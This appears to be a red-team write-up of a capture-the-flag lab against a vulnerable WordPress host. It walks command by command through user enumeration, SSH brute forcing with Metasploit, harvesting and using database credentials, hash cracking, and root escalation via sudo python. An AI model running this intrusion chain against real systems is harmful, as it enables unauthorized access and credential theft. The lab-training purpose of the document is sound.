# Red Team: Summary of Operations
## Table of Contents
- Exposed Services
- Exploitation

## Exposed Services
Nmap scan results for each machine reveal the below services and OS details:

```
$ nmap -sV 192.168.1.0/24
```
![nmap scan](images/nmap_scan.png)

This scan identifies the services below as potential points of entry:
  - Target 1

  |        Service       |   Port  |
  |:--------------------:|:-------:|
  |     OpenSSH 6.7p1    |    22   |
  |  Apache httpd 2.4.10 |    80   |
  | Samba smbd 3.X - 4.X | 139,445 |

The following vulnerabilities were identified on each target:
- Target 1
  - User enumeration
  - Weak user password
  - Unsalted user password hashes in WordPress database
  - Misconfiguration of user privileges leading to privilege escalation

## Exploitation
The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:

------
### `flag1`: b9bbcb33ellb80be759c4e844862482d

#### Exploits Used 
  - User enumeration
  - Brute force attacking a weak password
      
#### Method
  - First we enumerated the user accounts by exploiting the vulnerable WordPress site using WPScan
```
$ wpscan --url http://192.168.1.110/wordpress -e u
```
![wpscan](images/wpscan_user.png)

  - With the user accounts we can use Metasploit's SSH Login Check Scanner module and the rockyou wordlist to brute force the password
```
$ msfconsole
```
```
> search ssh_login
```
![ssh_login](images/search_ssh_login.png)

```
> use 0
```
```
> set rhost 192.168.1.110
```
```
> set username michael
```
```
> set pass_file /usr/share/wordlists/rockyou.txt
```
```
> set stop_on_success true
```
```
> run
```
![msfconsole](images/msfconsole_ssh_login.png)
```
> exit -y
```
  - After obtaining the password: `michael` we are able to SSH into `Target 1`
```
$ ssh michael@192.168.1.110
```
![SSH Michael](images/ssh_michael.png)
  - From here we used the follow command to locate `flag1`
```
$ grep -rnw / -e “flag1” 2> /dev/null
```
![flag1](images/flag1z.png)

-----
### `flag2`: fc3fd58dcdad9ab23faca6e9a3e581c

#### Exploit Used
  - Same exploit used to obtain flag 1

#### Method
  - Using the existing access we were able to locate `flag2` using the following command
```
$ find / -iname “flag2*” 2> /dev/null
```
```
$ cat /var/www/flag2.txt
```
![flag2](images/flag2.png)

-----
### `flag3`: afc01ab56b50591e7dccf93122770cd2

#### Exploit Used
  - Same exploit used to obtain flag 1

#### Method
  - Using the existing access we were able to locate `flag3` by harvesting the WordPress database login credentials
```
$ cat /var/www/html/wordpress/wp-config.php
```
![wp_config](images/wp_config.png)

  - With these credentials we dumped the entire database using the following command
```
$ mysqldump wordpress -u root -pR@v3nSecurity > dump
```
  - After dumping we ran a search for `flag3`
```
$ grep “flag3” dump
```
![flag4](images/flag3z.png)

> Note: flag4 was found here in addition to the next step

-----
### `flag4`: 715dea6c055b9fe3337544932f2941ce

#### Exploit Used
  - Unsalted user password hashes in WordPress database
  - Misconfiguration of user privileges leading to privilege escalation

#### Method
  - Logging into the WordPress database we were able to obtain the unsalted hash for the user account `steven`
```
$ mysql wordpress --user=root -pR@v3nSecurity
```
```
> select * from wp_users;
```
![wp_users](images/wp_users.png)
```
> exit
```
```
$ exit
```
  - With the hash we created a `hash.txt` for use with John the Ripper
```
$ echo "steven:\$P\$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/" > hash.txt
```
```
$ john hash.txt
```
![john hash](images/john_hash.png)
  - After cracking the password we were able to login as `steven`
```
$ ssh steven@192.168.1.110
```
  - When checking `steven`'s privileges we noticed he has sudo access to `/usr/bin/python`
```
$ sudo -l
```
![steven_sudo](images/sudo.png)
  - With this we were able to escalate to root
```
$ sudo python -c 'import pty;pty.spawn("/bin/bash")'
```
  - Finally running the following command for `flag4`
```
$ find / -iname "flag4*" 2> /dev/null
```
![find_flag4](images/find_flag4.png)
```
$ cat /root/flag4.txt
```
![flag4](images/flag4.png)

-----


